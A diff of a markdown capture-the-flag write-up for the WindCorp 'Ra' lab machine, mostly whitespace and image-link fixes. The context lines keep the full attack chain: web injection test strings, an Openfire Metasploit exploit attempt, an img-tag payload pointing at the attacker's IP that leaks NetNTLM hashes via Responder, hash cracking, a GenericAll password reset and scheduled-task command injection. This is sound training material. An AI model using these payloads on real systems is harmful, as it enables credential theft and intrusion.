@@ -81,7 +81,7 @@ Trying a null session with smbclient:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
-└─$ smbclient -L //10.112.176.170/ -N --option='client min protocol=SMB3'                                                     
+└─$ smbclient -L //10.112.176.170/ -N --option='client min protocol=SMB3'
 Anonymous login successful
 
         Sharename       Type      Comment
@@ -104,6 +104,7 @@ SMB  10.112.176.170  445  FIRE  [-] Error enumerating shares: STATUS_ACCESS_DENI
 ```
 
 Key takeaways:
+
 - **Null Auth:** `True` — we can bind without a password.
 - **Signing:** `True` — no NTLM relay attacks are possible.
 - **The Reality:** Even with a successful null auth, `--shares` returns `ACCESS_DENIED`.
@@ -192,40 +193,41 @@ First, I used **ffuf** to perform two types of discovery: **Directory Fuzzing** 
 └─$ ffuf -u http://10.112.176.170 -H "Host: FUZZ.windcorp.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 11334
 ```
 
-- Fuzzing for directories yielded only standard files like `index.html` and inaccessible folders. 
+- Fuzzing for directories yielded only standard files like `index.html` and inaccessible folders.
 - VHost enumeration produced a flood of false positives, and even after filtering by response size (`-fs 11334`) to kill the noise, no hidden subdomains or unique web surfaces were discovered.
 
 ### Let's Jump Into the Website
 
-![[1.png]]
+![Local Image](./assets/1.png)
 
 It is the main WindCorp website looks interesting, with a **Reset Password** button at the top. Clicking it opens a new tab at `http://fire.windcorp.thm/reset.asp` with a username field and some interesting security questions.
 
-![[2.png]]
+![Local Image](./assets/2.png)
 
 Okay, let's go back to the website first.
 
-While scrolling through the site, I identified a search bar and immediately tested it for common injection flaws: 
+While scrolling through the site, I identified a search bar and immediately tested it for common injection flaws:
+
 - **XSS** (`<script>alert(1)</script>`)
 - **SQLi** (`' OR 1=1--`)
 - **LFI** (`../../../../windows/win.ini`)
-- **OS Command Injection** (`test; whoami`). 
+- **OS Command Injection** (`test; whoami`).
 
 Unfortunately nothing stood out.
 
-On the website, I also discovered a list of IT support staff with several employees with profile pictures. 
+On the website, I also discovered a list of IT support staff with several employees with profile pictures.
 
-![[3.png]]
+![Local Image](./assets/3.png)
 
-![[4.png]]
+![Local Image](./assets/4.png)
 
-One stood out (`Lily Levesque`) because the image features the employee holding her dog which immediately reminded me of the **reset password security question**: *"What is/was your favorite pet's name?"* I examined the page source with `Ctrl+U` to dig deeper.
+One stood out (`Lily Levesque`) because the image features the employee holding her dog which immediately reminded me of the **reset password security question**: _"What is/was your favorite pet's name?"_ I examined the page source with `Ctrl+U` to dig deeper.
 
 Diving into the source code paid off immediately. Two critical pieces of intelligence:
 
 **1. Leaked XMPP JIDs**
 
-![[5.png]]
+![Local Image](./assets/5.png)
 
 The employee list is not just static text, it is pulling live status icons from the **Openfire** server on port 9090. This leaked many JIDs which are almost certainly User Principal Names (UPNs):
 
@@ -241,13 +243,13 @@ I saved these to a `users.txt` file immediately for **AS-REP Roasting** later.
 
 **2. The Photo Filename**
 
-![[6.png]]
+![Local Image](./assets/6.png)
 
 The profile picture I spotted earlier has a very revealing filename: `lilyleAndSparky.jpg` which hints the user's name is `lilyle` and her dog's name is `Sparky`.
 
 Jumping back to the reset password page: enter `lilyle` and `Sparky`, and we get a new password for `lilyle`.
 
-![[7.png]]
+![Local Image](./assets/7.png)
 
 ---
 
@@ -255,11 +257,11 @@ Jumping back to the reset password page: enter `lilyle` and `Sparky`, and we get
 
 Going to the previously discovered web page on port **9090**, it is the **Openfire Administration Login** page. I tried the `lilyle` credentials but they did not work.
 
-![[8.png]]
+![Local Image](./assets/8.png)
 
 Okay, here I got into a **rabbit hole** trying to find a vulnerability for the leaked version `Openfire 4.5.1`
 
-Doing some research I found there is a vulnerability for **Openfire 4.5.1**: ``CVE-2023-32315`` so I tried to exploit it with **Metasploit**:
+Doing some research I found there is a vulnerability for **Openfire 4.5.1**: `CVE-2023-32315` so I tried to exploit it with **Metasploit**:
 
 ```
 msf exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > check
@@ -274,7 +276,7 @@ msf exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > exploit
 [*] Exploit completed, but no session was created.
 ```
 
-Here I wasted so much time. The exploit created the user but could not authenticate with it. 
+Here I wasted so much time. The exploit created the user but could not authenticate with it.
 The lesson: version matching a CVE is a starting point, not a guarantee. I decided to move on.
 
 ---
@@ -332,7 +334,7 @@ To confirm RDP denial was not a bug, I listed the members of `Remote Desktop Use
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
-└─$ crackmapexec smb 10.112.176.170 -u 'lilyle' -p 'ChangeMe#1234' --groups 'Remote Desktop Users'                            
+└─$ crackmapexec smb 10.112.176.170 -u 'lilyle' -p 'ChangeMe#1234' --groups 'Remote Desktop Users'
 SMB         10.112.176.170  445    FIRE             windcorp.thm\IT
 ```
 
@@ -340,7 +342,7 @@ Unfortunately `lilyle` is not a member of the `IT` group:
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
-└─$ crackmapexec smb 10.112.176.170 -u 'lilyle' -p 'ChangeMe#1234' --groups 'IT'                                              
+└─$ crackmapexec smb 10.112.176.170 -u 'lilyle' -p 'ChangeMe#1234' --groups 'IT'
 
 SMB         10.112.176.170  445    FIRE             windcorp.thm\goldencat416
 SMB         10.112.176.170  445    FIRE             windcorp.thm\whiteleopard529
@@ -438,10 +440,10 @@ smb: \> get spark_2_8_3.deb
 
 ## Phase 6 — CVE-2020-12772: Spark XMPP → NetNTLM Hash Capture
 
-Previous nmap enumeration confirms the presence of an internal messaging ecosystem. 
-The server is running **Openfire** (XMPP) on ports `5222`, `7070`, and the management console on `9090`. 
+Previous nmap enumeration confirms the presence of an internal messaging ecosystem.
+The server is running **Openfire** (XMPP) on ports `5222`, `7070`, and the management console on `9090`.
 
->Having the **Spark** installation package in the `Shared` share **confirms** the domain is actively using this **third-party messaging app**.
+> Having the **Spark** installation package in the `Shared` share **confirms** the domain is actively using this **third-party messaging app**.
 
 ### Installing Spark
 
@@ -454,26 +456,26 @@ First I tried to install the package from the share, but it seems old and does n
 
 When opening the app we can authenticate as `Lily Levesque` with `ChangeMe#1234` on `10.112.176.170`.
 
-![[9.png]]
+![Local Image](./assets/9.png)
 
 **Important note:** In the **Advanced** options under the Certificates tab, you need to enable both `Accept self-signed` and `Accept expired` — the Openfire server uses a self-signed cert and Spark will refuse to connect otherwise.
 
-![[10.png]]
+![Local Image](./assets/10.png)
 
 ### The Vulnerability — CVE-2020-12772
 
-Doing some **research** and looking for vulnerabilities on this third-party app, I landed on ``CVE-2020-12772``. 
+Doing some **research** and looking for vulnerabilities on this third-party app, I landed on `CVE-2020-12772`.
 Basically when we open a chat with another user, we can send an `<img>` tag with our IP as the image source:
 
 ```html
 <img src=http://YOUR_TUN0_IP/test.img>
 ```
 
->Each time the target's client pre-loads it or the ROAR module does it automatically the client authenticates using Windows' own authentication stack, which leaks the receiver's **NetNTLM challenge-response hash** to whoever is listening.
+> Each time the target's client pre-loads it or the ROAR module does it automatically the client authenticates using Windows' own authentication stack, which leaks the receiver's **NetNTLM challenge-response hash** to whoever is listening.
 
 But first we need to target an **active user**. If you remember, on the website we have IT Support Staff **Buse** appearing with a green icon which hints she is the one currently **logged in**.
 
-![[11.png]]
+![Local Image](./assets/11.png)
 
 ### Setting Up Responder
 
@@ -484,16 +486,16 @@ But first we need to target an **active user**. If you remember, on the website 
 
 Now we send the payload to `Buse Candan` in Spark and wait:
 
-![[12.png]]
+![Local Image](./assets/12.png)
 
 We got a catch!
 
 ```
-[+] Listening for events...                                                                                                   
+[+] Listening for events...
 
 [HTTP] NTLMv2 Client   : 10.112.176.170
-[HTTP] NTLMv2 Username : WINDCORP\buse                                                                                        
-[HTTP] NTLMv2 Hash     : buse::WINDCORP:9e9ad43960348014:950F92F15A7F24267508C28AE27829A8:0101000000000000F49FBB4085CBDC0151F7D8DE72AE9AAE00000000020008004600410043004D0001001E00570049004E002D00570054005A0036003900310031005600570053004E00040014004600410043004D002E004C004F00430041004C0003003400570049004E002D00570054005A0036003900310031005600570053004E002E004600410043004D002E004C004F00430041004C00050014004600410043004D002E004C004F00430041004C0008003000300000000000000001000000002000004D2A944336D3BD6B350535EAED15EE96CFD461F32BB78217BD4054AA41D69B4D0A00100000000000000000000000000000000000090000000000000000000000                
+[HTTP] NTLMv2 Username : WINDCORP\buse
+[HTTP] NTLMv2 Hash     : buse::WINDCORP:9e9ad43960348014:950F92F15A7F24267508C28AE27829A8:0101000000000000F49FBB4085CBDC0151F7D8DE72AE9AAE00000000020008004600410043004D0001001E00570049004E002D00570054005A0036003900310031005600570053004E00040014004600410043004D002E004C004F00430041004C0003003400570049004E002D00570054005A0036003900310031005600570053004E002E004600410043004D002E004C004F00430041004C00050014004600410043004D002E004C004F00430041004C0008003000300000000000000001000000002000004D2A944336D3BD6B350535EAED15EE96CFD461F32BB78217BD4054AA41D69B4D0A00100000000000000000000000000000000000090000000000000000000000
 [*] Skipping previously captured hash for WINDCORP\buse
 ```
 
@@ -502,21 +504,21 @@ We got a catch!
 ### Cracking the Hash
 
 ```bash
-┌──(kali㉿kali)-[~/Writeups/Ra]                                                                                                         
+┌──(kali㉿kali)-[~/Writeups/Ra]
 └─$ echo 'buse::WINDCORP:9e9ad43960348014:950F92F15A7F24267508C28AE27829A8:0101000000000000F49FBB4085CBDC0151F7D8DE72AE9AAE00000000020008004600410043004D0001001E00570049004E002D00570054005A0036003900310031005600570053004E00040014004600410043004D002E004C004F00430041004C0003003400570049004E002D00570054005A0036003900310031005600570053004E002E004600410043004D002E004C004F00430041004C00050014004600410043004D002E004C004F00430041004C0008003000300000000000000001000000002000004D2A944336D3BD6B350535EAED15EE96CFD461F32BB78217BD4054AA41D69B4D0A00100000000000000000000000000000000000090000000000000000000000' > buse.hash
 ```
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
-└─$ john --wordlist=/usr/share/wordlists/rockyou.txt buse.hash                                                                
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt buse.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 5 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-uzunLM+3131      (buse)     
+uzunLM+3131      (buse)
 1g 0:00:00:01 DONE (2026-04-13 21:41) 0.8000g/s 2367Kp/s 2367Kc/s 2367KC/s v13tl1n76..uya051
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
-Session completed. 
+Session completed.
 ```
 
 Password is `uzunLM+3131`.
@@ -555,7 +557,7 @@ d-----  5/7/2020  2:58AM        Stuff
 
 Now, mostly certain that Flag 3 is on the **Administrator desktop**, we need to find a way to privesc to `administrator` or `NT AUTHORITY\SYSTEM`.
 
-These folders on Buse's Desktop are **rabbit holes** by the way, do not waste time connecting the dots or trying **steganography** on the images inside them. Like I did (ㆆ _ ㆆ). Moving on.
+These folders on Buse's Desktop are **rabbit holes** by the way, do not waste time connecting the dots or trying **steganography** on the images inside them. Like I did (ㆆ \_ ㆆ). Moving on.
 
 ### Further Enumeration — An Unusual Scripts Folder
 
@@ -650,15 +652,15 @@ Open BloodHound:
 
 Upload the data, mark `buse` as **owned**, and look for the **Shortest Path to `brittanycr`** from owned principals.
 
-![[13.png]]
+![Local Image](./assets/13.png)
 
 We find that we have **GenericAll** permission over `brittanycr` — which means basically full control of that user object. We can force change her **password**.
 
-![[14.png]]
+![Local Image](./assets/14.png)
 
 ### Force Password Reset via GenericAll
 
-![[15.png]]
+![Local Image](./assets/15.png)
 
 ```bash
 ┌──(kali㉿kali)-[~/Writeups/Ra]
@@ -669,7 +671,7 @@ Now we **pwned** `brittanycr` we can access and modify the `hosts.txt` content o
 
 ### Injecting the Payload
 
-We first create the payload. 
+We first create the payload.
 Note: don't forget the `;` to start the new payload.
 
 ```bash
@@ -770,14 +772,10 @@ Mode    LastWriteTime    Length Name
 
 In my journey for the **eCPPT** and **CRTP** prep, I found this room very helpful and rich. It covers a realistic multi-stage attack chain that does not hand you anything — web OSINT, XMPP protocol abuse, Active Directory permissions exploitation, and scheduled task injection all chained together. That kind of cross-domain thinking is exactly what those certifications test, and what real engagements look like.
 
-More than the technical content though, this room is a good exercise in **knowing when to move on**. I spent real time on ``CVE-2023-32315`` and on the **steganography** rabbit hole on Buse's desktop. The willingness to pivot instead of tunnel-visioning is as much a skill as running the right tool.
-
-As I said before, I did not just put a list of successful commands to pwn this box. I shared my thinking methodology as I am learning. 
+As I said before, I did not just put a list of successful commands to pwn this box. I shared my thinking methodology as I am learning.
 I hope you found it helpful.
 
 Thanks for reading!
-
-*P.S. A professional pentest report for this engagement is available on my GitHub: [link]*
 
 ---
 
